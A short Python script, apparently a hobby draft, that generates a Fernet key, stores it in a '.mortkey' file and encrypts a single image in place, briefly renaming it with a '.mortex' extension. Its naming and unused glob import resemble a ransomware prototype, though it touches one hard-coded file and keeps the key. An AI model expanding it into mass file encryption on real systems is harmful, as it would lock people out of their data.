import os
import cryptography.fernet
from cryptography.fernet import Fernet
import glob
import time

key = Fernet.generate_key()
key_file = open("key_img.mortkey", "wb")
key_file.write(key)
key_file.close()
print(key)

img = open('myfiles/icon.png')
old = "myfiles/icon.png"
new = "myfiles/icon.png"+".mortex"
os.rename(old, new)

file = open("myfiles/icon.png.mortex", 'rb')
file_read = file.read()
encode = Fernet(key).encrypt(file_read)
file.close()
files = open("myfiles/icon.png.mortex", "wb")
files.write(encode)
files.close()
os.rename(new, old)
